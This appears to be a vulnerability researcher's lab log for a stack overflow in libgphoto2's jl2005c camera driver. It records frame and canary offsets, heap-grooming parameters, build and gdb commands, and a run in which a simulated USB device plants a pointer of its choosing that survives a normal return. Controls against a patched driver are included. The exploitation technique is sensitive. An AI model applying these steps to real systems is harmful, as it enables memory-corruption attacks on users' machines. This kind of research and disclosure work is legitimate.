# W171 (2026-11-24): device-chosen pointer dereferenced after a normal return

# W170 left one lane open: its device-chosen CameraFile data pointer was read
# back through gp_file_get_data_and_size() only after diverting jl2005c_init
# to finish(). W171 asks whether the pointer survives a NORMAL return into
# camera_init, with gp_camera_init completing, and whether it can then be
# dereferenced to chosen bytes.

## Measured frame geometry (plain -O0 -g -fno-omit-frame-pointer build)
# gdb breakpoint at jl2005c_init entry (first executable line, +58):
#   r1 = jl2005c_init rbp; info = r1-0x4030, read destination info+0x200.
#   r2 = *(r1) = camera_init rbp; r1+8 = saved RIP (camera_init+952, 0x...4a80).
#   camera_init canary is at r2-0x18 (NOT r2-8: r2-8 holds saved rbx).
#   camera_init saved rbx/rbp/RIP are at r2-8 / r2 / r2+8.
# Bulk offset B maps to r1-0x3E30+B, so:
#   jl2005c_init canary/saved rbp/saved RIP : B = 0x3E28 / 0x3E30 / 0x3E38
#   camera_init canary                     : B = 0x3EF8
#   camera_init saved rbx/rbp/RIP          : B = 0x3F08 / 0x3F10 / 0x3F18
# The :152 overflow fills these with 0x41 unless the reply restores them.
# The caller canary restore is essential: without it the process aborts in
# camera_init with "*** stack smashing detected ***". With it, but without
# the caller saved rbx/rbp/RIP restores, camera_init faults at its ret with
# a 0x4141414141414141 return address.

## Heap layout
# The five gdb inferior calls (setenv/snprintf) shift the heap. With the
# gdb-injected frame values, drain=24 puts the victim at priv+0x4370, out of
# reach of the 0x4000-byte reply: the victim is then observed fresh (refcount
# 1, zero data/size) and the deref yields nothing. Measured sweep:
#   drain=20 -> priv-0x5a0; 21 -> priv-0x410; 22 -> priv+0x4050;
#   23 -> priv+0x41e0; 24 -> priv+0x4370; 25 -> priv+0x4500; 26 -> priv+0x4690.
# drain=22 restores W170's layout, so bulk 0x3F90/0x3F98/0x3FA0 again steer
# the victim's accesstype/size/data.

## Build (paths relative to the repository root)
# Plain tree src/libgphoto2-2.5.34-plain, configured as in REAL-BUILD.md with
# live/vusb-jl2005.patch applied. Local-only incremental patch below applies
# on top of evidence/replay-vusb-victim.patch (dry-run `patch -p1` OK from the
# patched source root):
#   evidence/replay-vusb-normal-return.patch
#   evidence/replay-normal_return_probe.c  -> live/normal_return_probe.c
#   evidence/replay-normal-return.gdb      -> gdb -batch -x script ./live/normal_return_probe
#   cd src/libgphoto2-2.5.34-plain
#   make -C libgphoto2_port && make -C libgphoto2_port install
#   P=$PWD/installdir-plain
#   gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I$P/include \
#     -o ../../live/normal_return_probe ../../live/normal_return_probe.c \
#     -L$P/lib -lgphoto2 -lgphoto2_port -Wl,-rpath,$P/lib
# Env for every run:
#   CAMLIBS=$P/lib/libgphoto2/2.5.34
#   IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb
#   LD_LIBRARY_PATH=$P/lib   port usb:001,001
# The probe sets the process canary, a marker buffer address/length and a
# finish() fallback RIP; the gdb script at the jl2005c_init breakpoint
# overrides M2SHELL_JL2005_RBP, M2SHELL_JL2005_RIP, M2SHELL_VUSB_CALLER_RBX,
# M2SHELL_VUSB_CALLER_RBP and M2SHELL_VUSB_CALLER_RIP with the live stack
# values. The canary is NOT overridden: it is the probe's own %fs:0x28.

## Attack: normal return, real API returns chosen pointer, deref yields marker
$ env ... M2SHELL_JL2005_VUSB=v M2SHELL_JL2005_COUNT=1022 \
    M2SHELL_VUSB_DRAIN=22 M2SHELL_VUSB_RESTORE_CALLER_CANARY=1 \
    M2SHELL_VUSB_ACCESSTYPE=0 \
    gdb -q -batch -x evidence/replay-normal-return.gdb ./live/normal_return_probe
M2S_ENV M2SHELL_JL2005_CANARY=0x477c183f2516aa00
M2S_ENV M2SHELL_JL2005_RIP=0x00005555555553fd        # finish fallback, overridden
M2S_ENV M2SHELL_VUSB_DATA=0x555555556010             # probe marker buffer
M2S_ENV M2SHELL_JL2005_RBP=0x7fffffffd390            # gdb: camera_init rbp
M2S_ENV M2SHELL_JL2005_RIP=0x7ffff7bf4a80            # gdb: real saved RIP
M2S_ENV M2SHELL_VUSB_CALLER_RBX=0x555555559d90
M2S_ENV M2SHELL_VUSB_CALLER_RBP=0x7fffffffde30
M2S_ENV M2SHELL_VUSB_CALLER_RIP=0x7ffff7f3a0f3
VUSB_VICTIM 0x555555568060
GP_CAMERA_INIT rc=0                                  # normal return, not diversion
VICTIM_AT_CONSUMER+150 = 0x0000000000000000          # chosen accesstype = MEMORY
VICTIM_AT_CONSUMER+158 = 0x000000000000001d          # chosen size = 29
VICTIM_AT_CONSUMER+160 = 0x0000555555556010          # chosen data pointer
CONSUMER_GET rc=0 data=0x555555556010 size=0x1d      # real gp_file_get_data_and_size
DEREF_READBACK bytes=29 text=M2SHELL_DEREF_MARKER_20261124
NORMAL_RETURN_COMPLETE
Inferior exited normally, rc=0.

## Controls
safe fill (M2SHELL_JL2005_FILL=0x00, data=0, size=0), same gdb frame values:
    GP_CAMERA_INIT rc=0; CONSUMER_GET rc=0 data=(nil) size=0x0;
    DEREF_SKIP no usable pointer; NORMAL_RETURN_COMPLETE.
count=100 (no oversized read):
    GP_CAMERA_INIT rc=0; CONSUMER_SKIP no victim; NORMAL_RETURN_COMPLETE.
wrong canary (M2SHELL_JL2005_CANARY=0xdeadbeefdeadbeef):
    *** stack smashing detected ***; SIGABRT before any diversion or consumer.
fixed camlib (pins/fix-6a3393d.patch applied, camlib rebuilt):
    no 16384-byte bulk read, no VUSB_VICTIM, CONSUMER_SKIP no victim,
    GP_CAMERA_INIT rc=0. Fix reversed and camlib rebuilt: attack again returns
    the chosen pointer, size and marker text.
omitted caller canary restore: *** stack smashing detected *** in camera_init.
omitted caller rbx/rbp/RIP restores: SIGSEGV at camera_init ret with a
    0x4141414141414141 return address.
drain=24 (wrong layout): victim at priv+0x4370, fields remain fresh,
    CONSUMER_GET rc=0 data=(nil) size=0x0.

## Negative: gphoto2's own consumer aborts on the corrupted top chunk
With M2SHELL_TRY_SAVE=1 the probe calls gp_file_save() after the same
CONSUMER_GET. It prints "malloc(): corrupted top size" and SIGABRT before
writing any bytes (0-byte output file). The dereference demonstrated here is
therefore the probe's own read of the API-returned pointer, not a successful
gphoto2-side write. The device's 0x41 fill corrupts the top-chunk header.

## Disposition
Rung 4 strengthened at the real-build scope: a device reply + lab-known
canary/frame values lets jl2005c_init return normally through the real
camera_init, gp_camera_init completes, and a device-chosen pointer with a
chosen length survives in a live CameraFile; the real gp_file_get_data_and_size
returns them and dereferencing the pointer yields the device-chosen 29-byte
marker. Controls: safe fill, count 100, wrong canary, fixed/reversed camlib
and two omitted-restore failures. This is NOT rung 5: canary and every saved
register are read by gdb from the live process, victim placement is a lab
hook, the canary is not device-recovered, no physical USB/wire/consumer
network path exists, no command runs, gphoto2's own file consumer aborts on
heap corruption, and there is no independent witness replay of W171.
Rung 5 stays UNKNOWN.
